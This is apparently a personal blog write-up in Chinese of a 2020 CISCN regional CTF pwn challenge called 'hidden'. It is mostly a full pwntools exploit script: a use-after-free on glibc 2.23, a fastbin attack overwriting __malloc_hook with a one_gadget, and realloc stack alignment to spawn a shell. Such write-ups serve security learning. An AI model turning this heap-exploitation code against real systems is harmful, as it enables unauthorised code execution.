---
title: 2020ciscn华东南
date: 2020-09-22 21:13:49
tags: CTF
---
挺难做的，爆0，第一天修了俩题，第二天差一点做出一题来了，修了一题   
先写一个简单的  
## hidden  
UAF，2.23，直接fastbin attack，realloc调栈  
![](1.png)  
### exp  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './hidden' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("172.20.16.114",8888)
elf=ELF(binary)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
def add(idx):
    p.sendlineafter('choice: \n', "001")
    p.sendlineafter('idx\n', str(idx))
    #p.sendafter('servnat:', name)
def edit(idx,content,):
    p.sendlineafter('choice: \n', '002')
    p.sendlineafter('idx\n', str(idx))
    p.sendafter('mark\n',content)
def delete(index):
    p.sendlineafter('choice: \n', '003')
    p.sendlineafter('idx\n', str(index))   
def exp():
    add("000")
    add("001")
    edit("000"," ")
    addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    log.success("addr==>" + hex(addr))
    libc_base = addr - 0x3c4d20
    log.success("libc_base==>" + hex(libc_base))
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    one_gadget = libc_base + 0xf1207
    realloc = libc_base + libc.sym['realloc']

    delete("000")
    edit("000",p64(malloc_hook-0x23))
    add("000")
    add("001")
    edit("001","a"*0xb + p64(one_gadget)+p64(realloc))
    add("001")
    #gdb.attach(p)

    p.interactive()
exp()
```  
![](2.png)  
</br>
后面的题没时间就不写了（x  